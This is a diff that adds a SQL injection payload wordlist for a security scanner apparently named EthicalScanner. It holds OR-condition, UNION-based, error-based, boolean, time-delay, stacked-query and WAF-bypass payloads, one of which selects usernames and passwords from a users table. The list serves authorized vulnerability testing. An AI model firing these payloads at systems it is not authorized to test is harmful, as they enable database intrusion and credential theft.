@@ -1,0 +1,70 @@
+# EthicalScanner - SQLi sample wordlist
+# Format: one injection per line, # = comment
+# Only test systems you are authorized to test.
+
+# -- Basic injections --
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+--
+-- -
+/*
+*/
+
+# -- OR conditions --
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+1 OR 1=1
+1' OR '1'='1
+1" OR "1"="1
+' OR 1=1--
+' OR 1=1#
+
+# -- UNION based --
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+1' UNION SELECT username,password FROM users--
+
+# -- Error based --
+' AND 1=CONVERT(int,@@version)--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND (SELECT 6765 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# -- Boolean based --
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1' AND 1=1--
+1' AND 1=2--
+
+# -- Time based --
+# NOTE: the scanner only detects error-based SQLi (database error
+# messages in the response). These payloads are sent, but a delayed
+# response is NOT flagged. They are useful with other tools.
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+' AND SLEEP(5)--
+1; WAITFOR DELAY '0:0:5'--
+
+# -- Stacked queries (read-only probes) --
+'; SELECT 1--
+1; SELECT 1--
+
+# -- Bypass WAF --
+' /*!OR*/ '1'='1
+' %09OR%09 '1'='1
+'%20OR%201=1--
